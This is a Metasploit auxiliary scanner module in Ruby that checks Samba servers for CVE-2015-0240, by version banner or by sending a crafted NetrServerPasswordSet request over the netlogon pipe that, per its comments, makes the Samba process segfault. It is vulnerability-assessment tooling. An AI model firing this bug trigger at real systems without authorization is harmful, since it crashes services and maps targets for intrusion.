##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client
  include Msf::Exploit::Remote::SMB::Client::Authenticated

  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT  = Rex::Proto::SMB::Exceptions
  CONST  = Rex::Proto::SMB::Constants

  RPC_NETLOGON_UUID = '12345678-1234-abcd-ef00-01234567cffb'

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Samba _netr_ServerPasswordSet Uninitialized Credential State',
      'Description'    => %q{
        This module checks if a Samba target is vulnerable to an uninitialized variable creds vulnerability.
      },
      'Author'         =>
        [
          'Richard van Eeden', # Original discovery
          'sleepya',           # Public PoC for the explicit check
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2015-0240'],
          ['OSVDB', '118637'],
          ['URL', 'https://securityblog.redhat.com/2015/02/23/samba-vulnerability-cve-2015-0240/'],
          ['URL', 'https://gist.github.com/worawit/33cc5534cb555a0b710b'],
          ['URL', 'https://www.nccgroup.com/en/blog/2015/03/samba-_netr_serverpasswordset-expoitability-analysis/']
        ],
      'DefaultOptions' =>
        {
          'SMBDirect'               => true,
          'SMBPass'                 => '',
          'SMBUser'                 => '',
          'SMBDomain'               => '',
          'DCERPC::fake_bind_multi' => false
        }
    ))

    # This is a good example of passive vs explicit check
    register_options([
      OptBool.new('PASSIVE', [false, 'Try banner checking instead of triggering the bug', false])
    ])

    # It's either 139 or 445. The user should not touch this.
    deregister_options('RPORT')
  end

  def rport
    @smb_port || datastore['RPORT']
  end


  # This method is more explicit, but a major downside is it's very slow.
  # So we leave the passive one as an option.
  # Please also see #maybe_vulnerable?
  def is_vulnerable?(ip)
    begin
      connect
      smb_login
      handle = dcerpc_handle(RPC_NETLOGON_UUID, '1.0','ncacn_np', ["\\netlogon"])
      dcerpc_bind(handle)
    rescue ::Rex::Proto::SMB::Exceptions::LoginError,
      ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      elog("#{e.message}\n#{e.backtrace * "\n"}")
      return false
    rescue Errno::ECONNRESET,
        ::Rex::Proto::SMB::Exceptions::InvalidType,
        ::Rex::Proto::SMB::Exceptions::ReadPacket,
        ::Rex::Proto::SMB::Exceptions::InvalidCommand,
        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,
        ::Rex::Proto::SMB::Exceptions::NoReply => e
      elog("#{e.message}\n#{e.backtrace * "\n"}")
      return false
    rescue ::Exception => e
      elog("#{e.message}\n#{e.backtrace * "\n"}")
      return false
    end

    # NetrServerPasswordSet request packet
    stub =
      [
        0x00,                         # Server handle
        0x01,                         # Max count
        0x00,                         # Offset
        0x01,                         # Actual count
        0x00,                         # Account name
        0x02,                         # Sec Chan Type
        0x0e,                         # Max count
        0x00,                         # Offset
        0x0e                          # Actual count
      ].pack('VVVVvvVVV')

    stub << Rex::Text::to_unicode(ip) # Computer name
    stub << [0x00].pack('v')          # Null byte terminator for the computer name
    stub << '12345678'                # Credential
    stub << [0x0a].pack('V')          # Timestamp
    stub << "\x00" * 16               # Padding

    begin
      dcerpc.call(0x06, stub)
    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      elog("#{e.message}\n#{e.backtrace * "\n"}")
    rescue Errno::ECONNRESET,
        ::Rex::Proto::SMB::Exceptions::InvalidType,
        ::Rex::Proto::SMB::Exceptions::ReadPacket,
        ::Rex::Proto::SMB::Exceptions::InvalidCommand,
        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,
        ::Rex::Proto::SMB::Exceptions::NoReply => e
      elog("#{e.message}\n#{e.backtrace * "\n"}")
    rescue ::Exception => e
      if e.to_s =~ /execution expired/i
        # So what happens here is that when you trigger the buggy code path, you hit this:
        #   Program received signal SIGSEGV, Segmentation fault.
        #   0xb732ab3b in talloc_chunk_from_ptr (ptr=0xc) at ../lib/talloc/talloc.c:370
        #   370   if (unlikely((tc->flags & (TALLOC_FLAG_FREE | ~0xF)) != TALLOC_MAGIC)) {
        # In the Samba log, you'll see this as an "internal error" and there will be a "panic action".
        # And then Samba will basically not talk back to you at that point. In that case,
        # you will either lose the connection, or timeout, or whatever... depending on the SMB
        # API you're using. In our case (Metasploit), it's "execution expired."
        # Samba (daemon) will stay alive, so it's all good.
        return true
      else
        raise e
      end
    end

    false
  ensure
    disconnect
  end


  # Returns the Samba version
  def get_samba_info
    res = ''
    begin
      res = smb_fingerprint
    rescue ::Rex::Proto::SMB::Exceptions::LoginError,
      ::Rex::Proto::SMB::Exceptions::ErrorCode
      return res
    rescue Errno::ECONNRESET,
        ::Rex::Proto::SMB::Exceptions::InvalidType,
        ::Rex::Proto::SMB::Exceptions::ReadPacket,
        ::Rex::Proto::SMB::Exceptions::InvalidCommand,
        ::Rex::Proto::SMB::Exceptions::InvalidWordCount,
        ::Rex::Proto::SMB::Exceptions::NoReply
      return res
    rescue ::Exception => e
      if e.to_s =~ /execution expired/
        return res
      else
        raise e
      end
    ensure
      disconnect
    end

    res['native_lm'].to_s
  end


  # Converts a version string into an object so we can eval it
  def version(v)
    Gem::Version.new(v)
  end


  # Passive check for the uninitialized bug. The information is based on http://cve.mitre.org/
  def maybe_vulnerable?(samba_version)
    v = samba_version.scan(/Samba (\d+\.\d+\.\d+)/).flatten[0] || ''
    return false if v.empty?
    found_version = version(v)

    if found_version >= version('3.5.0') && found_version <= version('3.5.9')
      return true
    elsif found_version >= version('3.6.0') && found_version < version('3.6.25')
      return true
    elsif found_version >= version('4.0.0') && found_version < version('4.0.25')
      return true
    elsif found_version >= version('4.1.0') && found_version < version('4.1.17')
      return true
    end

    false
  end


  # Check command
  def check_host(ip)
    samba_info = ''
    smb_ports = [445, 139]
    smb_ports.each do |port|
      @smb_port = port
      samba_info = get_samba_info
      vprint_status("Samba version: #{samba_info}")

      if samba_info !~ /^samba/i
        vprint_status("Target isn't Samba, no check will run.")
        return Exploit::CheckCode::Safe
      end

      if datastore['PASSIVE']
        if maybe_vulnerable?(samba_info)
          flag_vuln_host(ip, samba_info)
          return Exploit::CheckCode::Appears
        end
      else
        # Explicit: Actually triggers the bug
        if is_vulnerable?(ip)
          flag_vuln_host(ip, samba_info)
          return Exploit::CheckCode::Vulnerable
        end
      end
    end

    return Exploit::CheckCode::Detected if samba_info =~ /^samba/i

    Exploit::CheckCode::Safe
  end


  # Reports to the database about a possible vulnerable host
  def flag_vuln_host(ip, samba_version)
    report_vuln(
      :host  => ip,
      :port  => rport,
      :proto => 'tcp',
      :name  => self.name,
      :info  => samba_version,
      :refs  => self.references
    )
  end


  def run_host(ip)
    peer = "#{ip}:#{rport}"
    case check_host(ip)
    when Exploit::CheckCode::Vulnerable
      print_good("The target is vulnerable to CVE-2015-0240.")
    when Exploit::CheckCode::Appears
      print_good("The target appears to be vulnerable to CVE-2015-0240.")
    when Exploit::CheckCode::Detected
      print_status("The target appears to be running Samba.")
    else
      print_status("The target appears to be safe")
    end
  end
end

